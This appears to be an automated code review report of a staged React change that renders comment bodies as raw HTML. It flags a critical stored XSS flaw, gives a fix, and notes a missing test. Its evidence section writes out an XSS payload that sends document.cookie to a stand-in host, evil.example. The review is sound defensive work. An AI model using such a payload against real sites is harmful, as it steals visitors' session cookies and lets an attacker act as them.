**Scope:** staged (git diff --cached)

## Intent

**Intent:** inferred: show each comment's body under its author in `CommentList`, turning newlines into line breaks (diff).
**Requirements:** none stated.
**Scope creep:** not judged: no source states a requirement.
**Sources not read:** none.

## What Was Done Well

- The change is small and does one thing.
- The test now asserts that the body renders, not only the author.
- The list keeps its stable `key={comment.id}`.

## Findings

### Security — Critical

**Location:** `src/components/CommentList.tsx:9`
**Issue:** `comment.body` is injected as raw HTML through `dangerouslySetInnerHTML`. The only transformation is replacing `\n` with `<br>`, so nothing escapes or sanitizes the body.
**Evidence:** A comment is saved with the body `<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">` → `CommentList` renders it as markup → the `onerror` handler runs in every visitor's browser (stored XSS). The attacker can then read the cookies and page data that script can reach, or act as the viewer. Verification checked `package.json` and the repository files (`git ls-files`): there is no sanitizer dependency such as DOMPurify, and no caller of `CommentList` that sanitizes the data. The `Comment` type is a plain `string`. The React precedent "JSX escapes text" does not apply, because its exception names `dangerouslySetInnerHTML`.
**Confidence:** High
**Fix:** Render the body as text, which React escapes. Use `<p style={{ whiteSpace: 'pre-line' }}>{comment.body}</p>` to keep the line breaks without HTML. If rich HTML is really required, sanitize it with an allow-list sanitizer such as DOMPurify before injecting it.

### Tests/Coverage — Suggestion

**Location:** `src/components/CommentList.test.tsx:6-9`
**Issue:** The test only uses a plain body (`'Hello'`). It does not cover the newline-to-`<br>` conversion or a body that contains markup.
**Evidence:** A body such as `<b>x</b>\ny` → the new behavior is untested, so a change that breaks the line breaks or the escaping would still pass.
**Confidence:** High
**Fix:** Add a case with a multi-line body and a body containing HTML. Assert that the markup appears as literal text and that no element is created from it.

## Summary

| Category              | Critical | Warning | Suggestion | N/A |
|-----------------------|----------|---------|------------|-----|
| Security              | 1        | 0       | 0          |     |
| Performance           | 0        | 0       | 0          |     |
| Tests/Coverage        | 0        | 0       | 1          |     |
| Architecture          | 0        | 0       | 0          |     |
| Code & File Size      | 0        | 0       | 0          |     |
| Potential Bugs        | 0        | 0       | 0          |     |
| Accessibility         | 0        | 0       | 0          |     |
| Observability         |          |         |            | N/A |
| API Design            |          |         |            | N/A |
| Resilience            |          |         |            | N/A |
| DB Migrations         |          |         |            | N/A |
| Concurrency           |          |         |            | N/A |
| i18n                  |          |         |            | N/A |
| Privacy/Compliance    |          |         |            | N/A |
| Architecture Patterns |          |         |            | N/A |
| Stack-Specific        | 0        | 0       | 0          |     |
| **Total**             | **1**    | **0**   | **1**      |     |

**Verification:** 1 Critical/Warning candidate checked, 0 refuted.
**Review effort:** 1/5 — up to 50 changed lines in 2 files; no risk area.
**Relevant tests:** changed — `src/components/CommentList.test.tsx` now asserts that the author and the body `Hello` render. It does not cover the newline conversion or a body that contains HTML. Execution: not run.
**Look first:** `src/components/CommentList.tsx` (the raw-HTML injection of `comment.body`), `src/components/CommentList.test.tsx` (no test of the new rendering behavior).
**Ready to merge:** No — 1 Critical finding must be fixed before merging.

## Audit

**Files reviewed:** 2 of 2 changed files: `src/components/CommentList.test.tsx`, `src/components/CommentList.tsx`.
**Read for context:** `package.json`, `skill:references/accessibility.md`, `skill:references/intent.md`, `skill:stacks/react.md`, `skill:stacks/typescript.md`.
**Checked with no findings:** Performance, Architecture, Code & File Size, Potential Bugs, Accessibility, Stack-Specific.
**Not verified:** nothing.
